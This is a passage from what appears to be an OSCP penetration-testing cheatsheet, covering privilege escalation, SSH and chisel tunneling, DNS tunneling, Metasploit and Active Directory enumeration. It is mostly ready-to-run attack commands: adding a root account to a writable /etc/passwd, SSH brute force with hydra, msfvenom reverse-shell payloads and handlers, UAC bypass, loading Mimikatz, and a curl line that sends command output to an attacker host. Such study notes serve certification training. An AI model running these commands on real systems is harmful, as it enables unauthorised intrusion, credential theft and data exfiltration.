account (principal) does this task get executed?</li> <li>What triggers are specified for the task?</li> <li>What actions are executed when one or more of these triggers are met?</li> </ul> <p>Enumerate Scheduled Tasks</p> <pre><code>Get-ScheduledTask\n</code></pre> <pre><code>schtasks /query /fo LIST /v\n</code></pre> <p>Enumerate scheduled tasks run by user</p> <pre><code>schtasks /query /fo LIST /v | \n    ForEach-Object -Begin { $block = @() } `\n                   -Process {\n                       if ($_ -eq \"\") {\n                           if ($block -match \"Run As User:\\s+daveadmin\") {\n                               $block -join \"`n\"\n                               \"`n\" + (\"-\"*80) + \"`n\"\n                           }\n                           $block = @()\n                       } else {\n                           $block += $_\n                       }\n                   }\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#using-exploits","title":"Using Exploits","text":"<p>Kernel Exploits</p> <pre><code>systeminfo\n\n## Installed Security Patches\nGet-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq \"Security Update\" }\n</code></pre> <p>Abuse SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege - Potato Vulnerabilities</p> <p>https://github.com/BeichenDream/GodPotato</p> <p>GitHub - tylerdotrar/SigmaPotato: SeImpersonate privilege escalation tool for Windows 8 - 11 and Windows Server 2012 - 2022 with extensive PowerShell and .NET reflection support.</p> <p>Jorge Lajara Website</p>  \ud83d\udca1  Other privileges that may lead to privilege escalation are ***SeBackupPrivilege***, ***SeAssignPrimaryToken***, ***SeLoadDriver***, and ***SeDebug***."},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#linux-privilege-escalation","title":"Linux Privilege Escalation","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-linux","title":"Enumerating Linux","text":"<p>Manual Enumeration</p> <pre><code>## Enumerate OS/Kernel\ncat /etc/issue\ncat /etc/*-release\nuname -a\n\n## List system processes\nps aux\n\n## List all connections\nnetstat -antp\n\n## Firewall rules\ncat /etc/iptables/rules.v4\n\n## Cron jobs - Task Scheduler\nls -lah /etc/cron*\ncrontab -l\nsudo crontab -l\n\n## Check the filesystem for installed cron jobs\ngrep \"CRON\" /var/log/syslog\n\n## Find directory/word writable by the current user\nfind / -writable -type d 2&gt;/dev/null\nfind / -writable -type f 2&gt;/dev/null\n\n## Lists all drives that will be mounted at boot time\ncat /etc/fstab\n\n## List all mounted filesystems\nmount\n\n## List all available disks\nlsblk\n\n## List loaded kernel modules\nlsmod\n/sbin/modinfo [moduleName]\n\n## Search for SUID-marked binaries\nfind / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p>Automated Enumeration</p> <p>unix-privesc-check</p> <p>PEASS-ng/linPEAS at master \u00b7 peass-ng/PEASS-ng</p> <p>https://github.com/rebootuser/LinEnum</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#exposed-confidential-information","title":"Exposed Confidential Information","text":"<p>Inspecting User Trails</p> <pre><code>## Environment variables\nenv\n\n## .bashrc configuration file\ncat .bashrc\n\n## Generate custom wordlist\ncrunch 6 6 -t Lab%%% &gt; wordlist\n\n## SSH brute force\nhydra -l [user] -P [wordlist]  [ip] -t 4 ssh -V\n</code></pre> <p>Inspecting Service Footprints</p> <pre><code>## Enumerate all the running processes that contains \"pass\"\nwatch -n 1 ps -aux | grep \"pass\"\n\n## Capture traffic in and out of the loopback interface that contains \"pass\"\nsudo tcpdump -i lo -A | grep \"pass\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#insecure-file-permissions","title":"Insecure File Permissions","text":"<p>Abusing Cron Jobs</p> <pre><code> # Check the filesystem for installed cron jobs\ngrep \"CRON\" /var/log/syslog\n\n## List all cron jobs\nls -lah /etc/cron*\n\n## List current user cron jobs\ncrontab -l\nsudo crontab -l\n</code></pre> <p>Abusing Password Authentication - Word-Writable /etc/passwd</p> <pre><code>## Locate writable files\nfind / -writable -type d 2&gt;/dev/null\nfind / -writable -type f 2&gt;/dev/null\n\n## Generate password 'w00t'\nopenssl passwd w00t\n\n## Add superuser (root2)\necho \"root2:&lt;GeneratedPassword&gt;:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd\n\n## Authenticate as newly created superuser\nsu root2 (Pass: w00t)\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#insecure-system-components","title":"Insecure System Components","text":"<p>Abusing Setuid Binaries and Capabilities</p> <pre><code>## Search for SUID-marked binaries\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n## Search linux capabilities\n/usr/sbin/getcap -r / 2&gt;/dev/null\n</code></pre> <p>Exploiting Kernel Vulnerabilities</p> <pre><code>## Enumerate OS\ncat /etc/issue\n\n## Enumerate kernel\nuname -r\n\n## Enumerate architecture\narch\n\n## Assume that target is Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture\nsearchsploit \"linux kernel Ubuntu 16 Local Privilege Escalation\"   | grep  \"4.\" | grep -v \" &lt; 4.4.0\" | grep -v \"4.8\"\n</code></pre> <p>Linux Privilege Escalation References:</p> <p>Linux - Privilege Escalation - Internal All The Things</p> <p>Linux Privilege Escalation - HackTricks</p> <p>[apt get</p> <pre><code>        |\n\n        GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/)\n</code></pre> <p>Basic Linux Privilege Escalation - g0tmi1k</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#port-redirection-and-ssh-tunneling","title":"Port Redirection and SSH Tunneling","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#port-forwarding-with-linux-tools","title":"Port Forwarding with Linux Tools","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#port-forwarding-with-socat","title":"Port Forwarding with Socat","text":"<p>Forward 2345 port to 5432 postgresql</p> <pre><code>socat TCP-LISTEN:2345,fork TCP:10.10.10.10:5432\n</code></pre> <p></p> <p>Forward 2222 port to 22 SSH</p> <pre><code>socat TCP-LISTEN:2222,fork TCP:10.10.10.10:22\n</code></pre> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-tunneling","title":"SSH Tunneling","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-local-port-forwarding","title":"SSH Local Port Forwarding","text":"<p>SSH Port Forwarding</p> <pre><code>ssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [user]@[IP]\n\n## Example\nssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215\n</code></pre> <p></p> <p>Find open ports without scanning tools</p> <pre><code>for i in $(seq 1 254); do nc -zv -w 1 10.10.10.$i 445; done\n</code></pre> <p>Connect forwarded SMB port with smbmap</p> <pre><code>smbclient -p [port]  -L //[IP] --user [user] --password [pass]\n\nsmbclient -p [port]  //[IP]/[share] --user [user] --password [pass]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-dynamic-port-forwarding","title":"SSH Dynamic Port Forwarding","text":"<p>SSH Dynamic Port Forwarding</p> <pre><code>ssh -N -D [LOCAL_IP:]LOCAL_PORT] [user]@[IP]\n\n## Example\nssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215\n\n## Modify proxychains4.conf\necho \"socks5 [IP] [PORT]\" &gt;&gt; /etc/proxychains4.conf\n</code></pre> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-remote-port-forwarding","title":"SSH Remote Port Forwarding","text":"<p>SSH Remote Port Forwarding</p> <pre><code>## Kali - Attacker VM\nsudo systemctl start ssh\nsudo ss -ntplu\n\n## Remote VM\nssh -N -R LOCAL_IP:LOCAL_PORT:DEST_IP:DEST_PORT [user]@[KALI_IP]\n\n## Example\nssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4\n</code></pre> <p></p> <p>Authenticate Through Public Key Authentication</p> <pre><code>## Modify /etc/ssh/sshd_config to enable Public Key Authentication\nPubkeyAuthentication yes\n\n## Generate Private/Public Keys\nssh-keygen -f key\n\n## Copy *key.pub* in *authorized_keys* \n## Authenticate\nchmod 600 key\nssh [user]@[IP] -i key2\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ssh-remote-dynamic-port-forwarding","title":"SSH Remote Dynamic Port Forwarding","text":"<p>SSH Remote Dynamic Port Forwarding</p> <pre><code>ssh -N -R LOCAL_PORT kali@[KALI_IP]\n\n## Example\nssh -N -R 9998 kali@192.168.118.4\n\n## Modify proxychains4.conf\necho \"socks5 127.0.0.1 [PORT]\" &gt;&gt; /etc/proxychains4.conf\n</code></pre> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#using-sshuttle","title":"Using sshuttle","text":"<p>Pivoting using sshuttle</p> <pre><code>## Set up SSH port forwarding with socat or SSH\nsocat TCP-LISTEN:2222,fork TCP:[IP]:22\n\nssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [user]@[IP]\n\n## Use sshuttle to tunnel through the subnets \nsshuttle -r [user]@[IP]:2222 10.10.10.0/24 11.11.11.0/24\n</code></pre> <p>https://github.com/sshuttle/sshuttle</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#port-forwarding-with-windows-tools","title":"Port Forwarding with Windows Tools","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#sshexe","title":"ssh.exe","text":"\ud83d\udca1  ***SSH utilities -* %systemdrive%\\Windows\\System32\\OpenSSH**    \ud83d\udca1  OpenSSH higher than 7.6 can use be used for remote dynamic port forwarding.   <p>SSH Remote Dynamic Port Forwarding</p> <pre><code>## Locate SSH\nwhere ssh\ncd C:\\Windows\\System32\\OpenSSH\n\n## Remote Dynamic Port Forwarding \nssh.exe -N -R 9998 kali@[IP]\n\n## Update proxychains4.conf\necho \"socks5 127.0.0.1 [PORT]\" &gt;&gt; /etc/proxychains4.conf\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#plink","title":"Plink","text":"\ud83d\udca1  Plink doesn't have is remote dynamic port forwarding   <p>Plink Remote Port Forwarding</p> <pre><code>C:\\tmp\\plink.exe -ssh -l [user] -pw &lt;YOUR PASSWORD HERE&gt; -R [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [Attacker IP]\n\n## Example\nC:\\tmp\\plink.exe -ssh -l kali -pw &lt;YOUR PASSWORD HERE&gt; -R 127.0.0.1:9389:127.0.0.1:3389 192.168.118.4\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#netsh","title":"Netsh","text":"\ud83d\udca1  Netsh require administrative level access   <p>Netsh Remote Port Forwarding</p> <pre><code>## Remote Port Forwarding using Netsh \nnetsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215\n\n## List created connections\nnetsh interface portproxy show all\n\n## Add Firewall Rule\nnetsh advfirewall firewall add rule name=\"port_forward_ssh_2222\" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow\n\n## Delete Firewall Rule\nnetsh advfirewall firewall delete rule name=\"port_forward_ssh_2222\"\n\n## Delete Port Forward Rule\nnetsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#tunneling-through-deep-packet-inspection","title":"Tunneling Through Deep Packet Inspection","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#http-tunneling-with-chisel","title":"HTTP Tunneling with Chisel","text":"<p>Reverse Socks Port Forwarding </p> <pre><code>## Kali - Client\nchisel server --port [PORT] --reverse\n\n## Host A - Server\nchisel client [KALI_IP]:[PORT] R:socks &gt; /dev/null 2&gt;&amp;1 &amp;\n</code></pre> <p>Read the command output</p> <pre><code>chisel client [IP]:[PORT] R:socks &amp;&gt; /tmp/output; curl --data @/tmp/output http://[IP]:[PORT]\n</code></pre> <p>Check the opened ports</p> <pre><code>ss -ntplu\n</code></pre> <p>Port Forwarding with C... | 0xBEN | Notes</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#http-tunneling-with-lilogo-ng","title":"HTTP Tunneling with Lilogo-NG","text":"<p>Dynamic Port Forwarding with Ligolo-NG</p> <pre><code>Ligolo-Ng\n## Setting up Ligolo-Ng\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\nifconfig\n\n## Attack Host\n&gt; ./proxy -selfcert\nligolo-ng&gt; session\nligolo-ng&gt; ifconfig\n\nsudo ip route add &lt;Pivoting Network Subnet&gt; dev ligolo\nsudo ip route list\n\nligolo-ng&gt; start\n\n## Target Host\nagent.exe -connect &lt;IP&gt;:11601 -ignore-cert\n\nReference:\n&lt;https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/&gt;\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#dns-tunneling-fundamentals","title":"DNS Tunneling Fundamentals","text":"<p>In most cases, we'll ask a DNS *recursive resolver server for the DNS address record (*A record) of the domain. An A record is a DNS data type that contains an IPv4 address. The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.</p> <p>Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of *root name servers (as of 2022, there are 13 of them scattered around the world). Its first task is to send a DNS query to one of these root name servers. Because example.com has the \".com\" suffix, the root name server will respond with the address of a DNS name server that's responsible for the .com top-level domain (TLD). This is known as the TLD name server*.</p> <p>The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for example.com. The TLD name server will respond with the *authoritative name server for the example.com* domain.</p> <p>The recursive resolver then asks the example.com authoritative name server for the IPv4 address of www.example.com. The example.com authoritative name server replies with the A record for that.</p> <p>Example of query domain</p> <p></p> <p>In case scenario</p> <p></p>  \ud83d\udca1  In the real world, we will have registered the feline.corp domain name ourselves, set up the authoritative name server machine ourselves, and told the domain registrar that this server should be known as the authoritative name server for the feline.corp zone. However, for simplicity in this lab environment, FELINEAUTHORITY is provided pre-configured. In a real deployment, we would need to configure the server and take care of all other peripheral registrations to ensure that any other DNS servers would eventually find our server for all feline.corp requests.   <p>Configuration file fore Authoritative Name Server</p> <pre><code>kali@felineauthority:~$ cd dns_tunneling\n\nkali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf\n## Do not read /etc/resolv.conf or /etc/hosts\nno-resolv\nno-hosts\n\n## Define the zone\nauth-zone=feline.corp\nauth-server=feline.corp\n\nkali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d\n\nkali@felineauthority:~$ sudo tcpdump -i [interface] udp port 53\n</code></pre> <p>Check the DNS settings using the resolvectl utility</p> <pre><code>resolvectl status\n</code></pre> <p>Query the subdomain.feline.corp</p> <p></p> <p>Exfiltrate data through DNS </p> <pre><code>This would require a series of sequential requests. We could convert a\nbinary file into a long hex string representation, split this string\ninto a series of smaller chunks, then send each chunk in a DNS request\nfor **[hex-string-chunk]**.feline.corp. On the server side, we could\nlog all the DNS requests and convert them from a series of hex strings\nback to a full binary. We won't go into further details here, but this\nshould clarify the general concept of DNS network exfiltration.\n</code></pre> <p>Infiltrate data through DNS </p> <pre><code>kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf\n## Do not read /etc/resolv.conf or /etc/hosts\nno-resolv\nno-hosts\n\n## Define the zone\nauth-zone=feline.corp\nauth-server=feline.corp\n\n## TXT record\ntxt-record=www.feline.corp,here's something useful!\ntxt-record=www.feline.corp,Base64 or ASCII hex encoded data\n\nkali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d\n</code></pre> <p>Query to Infiltrate data</p> <pre><code>database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp\nServer:     192.168.50.64\nAddress:    192.168.50.64#53\n\nNon-authoritative answer:\nwww.feline.corp text = \"here's something useful!\"\nwww.feline.corp text = \"Base64 or ASCII hex encoded data\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#dns-tunneling-with-dnscat2","title":"DNS Tunneling with dnscat2","text":"\ud83d\udca1  A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.   <p>DNS Tunneling with dnscat2</p> <pre><code>## Server \nkali@felineauthority:~$ dnscat2-server feline.corp\n\n## Client \ndatabase_admin@pgdatabase01:~$ cd dnscat/\ndatabase_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp\n\n## DNS Tunelling\ndnscat2&gt; windows\ndnscat2&gt; window -i 1\ndnscat2&gt; ?\ndnscat2&gt; listen 127.0.0.1:[PORT] [REMOTE IP]:[PORT]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#the-metasploit-framework","title":"The Metasploit Framework","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#getting-familiar-with-metasploit","title":"Getting Familiar with Metasploit","text":"<p>Setup and Work with MSF</p> <pre><code>## Start the database service\nmsfdb init\n\n## Enable the database service at boot time\nsudo systemctl enable postgresql\n\n## Verify database connectivity\nmsf6 &gt; db_status\n\n## Create a workspace\nmsf6 &gt; workplace\nmsf6 &gt; workplace -a \"OSCP Workplace\"\n\n## Nmap scan with msfconsole\nmsf6 &gt; db_nmap -sS -sV [target]\n\n## List of all discovered hosts\nmsf6 &gt; hosts\n\n## List of all discovered services\nmsf6 &gt; services\nmsf6 &gt; services -p 445\n</code></pre> <p>Auxiliary Modules</p> <pre><code>## List all auxiliary modules\nmsf6 &gt; show auxiliary\n\n## Search for all SMB auxiliary modules\nmsf6 &gt; search type:auxiliary smb\n\n## Use module\nmsf6 &gt; auxiliary(scanner/smb/smb_version\n\n## Set RHOSTS to all discovered hosts with open port 445\nmsf6 auxiliary(scanner/smb/smb_version) &gt; services -p 445 --rhosts\n\n## Check detected vulnerabilities based on the results of run modules\nmsf6 auxiliary(scanner/smb/smb_version) &gt; vulns\n\n## Display all valid credentials we gathered\nmsf6 auxiliary(scanner/ssh/ssh_login) &gt; creds\n</code></pre> <p>Exploit Modules</p> <pre><code>## Search modules for Apache 2.4.49\nmsf6 &gt; search Apache 2.4.49\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#using-metasploit-payloads","title":"Using Metasploit Payloads","text":"<p>Staged vs Non-Staged Payloads</p> <pre><code>## The \"/\" character is used to denote whether a payload is staged or not\n## Staged payload are more stealth\n\n## Staged payload example\npayload/linux/x64/shell/reverse_tcp\n\n## Non-staged payload example\npayload/linux/x64/shell_reverse_tcp \n</code></pre> <p>Meterpreter Payload</p>  \ud83d\udca1  Note that all Meterpreter payloads are staged   <p>Meterpreter Payloads</p> <pre><code>## Note that all Meterpreter payloads are staged\n\n## Stealth \npayload/linux/x64/meterpreter_reverse_tcp\n\n## Not Stealth - Generate some traffic over the network\npayload/linux/x64/meterpreter/reverse_tcp\n\n## Moving through shell sessions\nmeterpreter &gt; shell\nmeterpreter &gt; channel -l \nmeterpreter &gt; channel -i [ID]\n</code></pre> <p>Executable Payloads</p> <pre><code>## List Payloads\nmsfvenom -l payloads --platform windows --arch x64\n\n## Generate payload - Non-staged\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o nonstaged.exe\n\n## Generate payload - Staged\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o staged.exe\n</code></pre>  \ud83d\udca1  For staged and other advanced payload types (such as Meterpreter), we must use multi/handler instead of tools like Netcat for the payload to work."},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#performing-post-exploitation-with-metasploit","title":"Performing Post-Exploitation with Metasploit","text":"<p>Core Meterpreter Post-Exploitation Features</p> <pre><code>## Display the time for which a user has been idle\nmeterpreter &gt; idletime\n\n## Get SYSTEM privleges\nmeterpreter &gt; getsystem\n\n## Migrate to differenct process\nmeterpreter &gt; ps\nmeterpreter &gt; migrate [Process ID]\nmeterpreter &gt; post/windows/manage/migrate\n\n## Create new process and migrate to it \nmeterpreter &gt; execute -H -f notepad\nmeterpreter &gt; migrate 2720\n</code></pre> <p>Post-Exploitation Modules</p> <pre><code>## Bypass UAC\nmsf6 &gt; search UAC\nmsf6 &gt; use exploit/windows/local/bypassuac_sdclt\n\n## Check if UAC is enabled\nmeterpreter &gt; run post/windows/gather/win_priv\nmeterpreter &gt; search bypassuac\nmsf &gt; use exploit/windiws/local/bypass_vbs\nmsf &gt; set session &lt;session_id&gt;\n\n\n## UAC Bypass using UACME tool\nhttps://github.com/hfiref0x/UACME\nmeterpreter &gt; upload Akagi64.exe\nmeterpreter &gt; upload Payload.exe                  \nshell &gt; .\\Akagi64.exe 23 C:\\Payload.exe           \nshell &gt; .\\Akagi64.exe 61 C:\\Payload.exe           \n\n## Load Extensions - Mimikatz\nmsf6 &gt; load ?\nmsf6 &gt; load kiwi\nmsf6 &gt; help\n</code></pre> <p>Pivoting with Metasploit</p> <pre><code>meterpreter &gt; run autoroute -s 10.10.10.0/24\nmeterpreter &gt; run autoroute -p\n\nbackground\nuse auxiliary/server/socks_proxy\nshow options\nset SVRPORT [9050]\nset VERSION [4a]\nexploit\njobs\n\n## Autoroutes\nmsf6 &gt; use multi/manage/autoroute\nmsf6 post(multi/manage/autoroute) &gt; set session [Session ID]\n\n## Port Forwarding\nmeterpreter &gt; portfwd add -l [Local IP] -p [Remote IP] -r [Host]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#automating-metasploit","title":"Automating Metasploit","text":"<p>Resource Scripts</p> <pre><code>## Pre installed resource scripts\nls -l /usr/share/metasploit-framework/scripts/resource\n\n## Manually create resource script - resource.rc\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter_reverse_https\nset LHOST 192.168.119.4\nset LPORT 443\nset AutoRunScript post/windows/manage/migrate \nset ExitOnSession false\nrun -z -j\n\nmsfconsole -r resource.rc\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-introduction-and-enumeration","title":"Active Directory Introduction and Enumeration","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-manual-enumeration","title":"Active Directory - Manual Enumeration","text":"\ud83d\udca1  While there is a Domain Admins group for each domain in the forest, members of the *Enterprise Admins* group are granted full control over all the domains in the forest and have Administrator privilege on all DCs"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-enumeration-using-legacy-windows-tools","title":"Active Directory - Enumeration Using Legacy Windows Tools","text":"\u26a0\ufe0f  When you have access to AD credentials, we suggest using RDP as much as  possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as  you will experience the [Kerberos Double Hop](https://posts.slayerlabs.com/double-hop/) issue. To avoid it, the simplest way is to use RDP.   <pre><code>net user /domain\nnet group /domain\n\nnet user [user] /domain\nnet group [group] /domain\n</code></pre> <p>Default Domain Groups</p> <p>Active Directory Security Groups</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-active-directory-using-powershell-and-net-classes","title":"Enumerating Active Directory using PowerShell and .NET Classes","text":"<p>Invoke the Domain Class and the GetCurrentDomain method - PdcRoleOwner property</p> <pre><code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n</code></pre> <p>enumeration.ps1</p> <pre><code>## Store the domain object in the $domainObj variable\n$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n## Print the variable\n$domainObj\n\n## Store the PdcRoleOwner name to the $PDC variable\n$PDC = $domainObj.PdcRoleOwner.Name\n\n## Print the $PDC variable\n$PDC\n\n## Store the Distinguished Name variable into the $DN variable\n$DN = ([adsi]'').distinguishedName\n\n## Print the $DN variable\n$DN\n</code></pre> <p>Build the full LDAP path</p> <pre><code>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName \n$LDAP = \"LDAP://$PDC/$DN\"\n$LDAP\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#adding-search-functionality-to-our-script","title":"Adding Search Functionality to our Script","text":"<p>Basic script to get each object in AD environment</p> <pre><code>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName \n$LDAP = \"LDAP://$PDC/$DN\"\n\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.FindAll()\n</code></pre> <p>Filter to enumerate all users in domain</p> <pre><code>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = $domainObj.PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName \n$LDAP = \"LDAP://$PDC/$DN\"\n\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"samAccountType=805306368\"\n$result = $dirsearcher.FindAll()\n\nForeach($obj in $result)\n{\n    Foreach($prop in $obj.Properties)\n    {\n        $prop\n    }\n\n    Write-Host \"-------------------------------\"\n}\n</code></pre> <p>Example of filter only certain User memberships</p> <pre><code>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = $domainObj.PdcRoleOwner.Name\n$DN = ([adsi]'').distinguishedName \n$LDAP = \"LDAP://$PDC/$DN\"\n\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n\n$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\n$dirsearcher.filter=\"name=jeffadmin\"\n$result = $dirsearcher.FindAll()\n\nForeach($obj in $result)\n{\n    Foreach($prop in $obj.Properties)\n    {\n        $prop.memberof\n    }\n\n    Write-Host \"-------------------------------\"\n}\n</code></pre> <p>Automation - Pass the parameter to filter the objects</p> <pre><code>function LDAPSearch {\n    param (\n        [string]$LDAPQuery\n    )\n\n    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\n    $DistinguishedName = ([adsi]'').distinguishedName\n\n    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$PDC/$DistinguishedName\")\n\n    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)\n\n    return $DirectorySearcher.FindAll()\n\n}\n</code></pre> <p>Example</p> <pre><code>Import-Module .\\function.ps1\n\n## List each user objects\nLDAPSearch -LDAPQuery \"(samAccountType=805306368)\"\n\n## List each group objects\nLDAPSearch -LDAPQuery \"(objectclass=group)\"\n\n## Filter group attributes\nforeach ($group in $(LDAPSearch -LDAPQuery \"(objectCategory=group)\")) {\n$group.properties | select {$_.cn}, {$_.member}\n}\n\n## Filter only certain group\n$sales = LDAPSearch -LDAPQuery \"(&amp;(objectCategory=group)(cn=Sales Department))\"\n$sales.properties.member\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ad-enumeration-with-powerview","title":"AD Enumeration with PowerView","text":"<pre><code>Import-Module .\\PowerView.ps1\n\n## Get Domain Information\nGet-NetDomain\n\n## Get Domain Users\nGet-NetUser\nGet-NetUser | select cn\nGet-NetUser | select cn,pwdlastset,lastlogon\n\n## Get Domian Groups\nGet-NetGroup | select cn\nGet-NetGroup \"Administrators\" | select member\n</code></pre> <p>About - PowerSploit</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#manual-enumeration-expanding-our-repertoire","title":"Manual Enumeration - Expanding our Repertoire","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-operating-systems","title":"Enumerating Operating Systems","text":"<p>Get Computers / Operating Systems using PowerView</p> <pre><code>Get-NetComputer\nGet-NetComputer | select operatingsystem,dnshostname\nGet-NetComputer | select dnshostname,operatingsystem,operatingsystemversion\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#getting-an-overview-permissions-and-logged-on-users","title":"Getting an Overview - Permissions and Logged on Users","text":"<p>Find Local Admin Access </p> <pre><code>Find-LocalAdminAccess\n</code></pre> <p>Find Remote Host Logged On Users</p> <pre><code>## Powerview - Not reliable\nGet-NetSession -ComputerName [host]\n\n## PSLoggedon\n.\\PsLoggedon.exe \\\\files04\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumeration-through-service-principal-names","title":"Enumeration Through Service Principal Names","text":"<p>Get SPN Users - Service Users</p> <pre><code>Get-NetUser -SPN | select samaccountname,serviceprincipalname\n\n## setspm\nsetspn -L [service_user]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-object-permissions","title":"Enumerating Object Permissions","text":"<p>Permissions</p> <pre><code>GenericAll: Full permissions on object\nGenericWrite: Edit certain attributes on the object\nWriteOwner: Change ownership of the object\nWriteDACL: Edit ACE's applied to object\nAllExtendedRights: Change password, reset password, etc.\nForceChangePassword: Password change for object\nSelf (Self-Membership): Add ourselves to for example a group\n</code></pre> <p>Get Object Permissions using Powerview</p> <pre><code>Get-ObjectAcl -Identity [object]\n\n## SecurityIdentifier - Object, which has access to\n## ActiveDirectoryRights  - Permission level\n\n## Example\nGet-ObjectAcl -Identity \"Management Department\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights\n</code></pre> <p>Convert SID to Object</p> <pre><code>Convert-SidToName [SID]\n\n## Example\n\"S-1-5-21-1987370270-658905905-1781884369-512\",\"S-1-5-21-1987370270-658905905-1781884369-1104\",\"S-1-5-32-548\",\"S-1-5-18\",\"S-1-5-21-1987370270-658905905-1781884369-519\" | Convert-SidToName\n</code></pre> <p>Add user to group</p> <pre><code>net group [group] [user] /add 